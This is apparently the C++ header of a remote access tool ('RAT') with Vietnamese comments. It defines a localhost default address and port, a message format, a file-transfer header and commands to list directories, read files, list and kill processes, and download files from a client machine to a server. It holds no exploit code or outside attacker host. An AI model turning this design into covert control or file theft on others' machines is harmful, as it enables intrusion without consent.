#pragma once

#include "platform.h"

#include <cstdint>
#include <string>

namespace RAT
{
    // Cấu hình mạng mặc định
    constexpr const char *DEFAULT_HOST = "127.0.0.1";
    constexpr int DEFAULT_PORT = 8888;

    // Kích thước gói tin: `[4 bytes: Độ dài dữ liệu (uint32_t)] + [N bytes: Nội dung văn bản]`
    constexpr size_t HEADER_SIZE = sizeof(uint32_t);
    constexpr uint32_t MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10mb

    // DS lệnh
    namespace Command
    {
        // 1. Duyệt thư mục: LIST_DIR <đường_dẫn>
        inline const std::string LIST_DIR = "LIST_DIR";
        // 2. Đọc file: READ_FILE <đường_dẫn>
        inline const std::string READ_FILE = "READ_FILE";
        // 3. Liệt kê tiến trình: LIST_PROC
        inline const std::string LIST_PROC = "LIST_PROC";
        // 4. Diệt tiến trình: KILL_PROC <PID>
        inline const std::string KILL_PROC = "KILL_PROC";
        // 5. Bảng trợ giúp: HELP
        inline const std::string HELP = "HELP";
        // 6. Thoát: EXIT
        inline const std::string EXIT = "EXIT";

        // 7. Download file: DOWNLOAD_FILE <remote_path> <local_path>
        inline const std::string DOWNLOAD_FILE = "DOWNLOAD_FILE";
    }

    constexpr size_t FILE_CHUNK_SIZE = 64 * 1024; // Kích thước của mỗi khối dữ liệu(64 KB)
    // Header bắt tay ban đầu khi gửi file
    struct FileTransferHeader
    {
        uint8_t status_code; // 0: Thành công (sẵn sàng gửi), 1: File không tồn tại, 2: Không có quyền đọc
        uint64_t file_size;  // Kích thước file thực tế (hỗ trợ file > 4GB)
    };

    // DS trạng thái trả về
    namespace Status
    {
        inline const std::string OK = "[+] ";   // Thành công
        inline const std::string ERR = "[!] ";  // Báo lỗi
        inline const std::string INFO = "[*] "; // Thông tin hệ thống
    }

    inline const std::string HELP_TEXT =
        "=================================== SHELL COMMANDS ================================\n"
        "  HELP                               : Hien thi danh sach cac lenh ho tro\n"
        "  LIST_DIR <path>                    : Xem danh sach file/thu muc tai <path>\n"
        "  READ_FILE <path>                   : Xem noi dung file tai <path>\n"
        "  DOWNLOAD_FILE <remote> <local>     : Tai file tu Client ve Server\n"
        "  LIST_PROC                          : Xem danh sach cac tien trinh dang chay\n"
        "  KILL_PROC <pid>                    : Ket thuc tien trinh <pid>\n"
        "  EXIT                               : Thoat\n"
        "===================================================================================\n";
}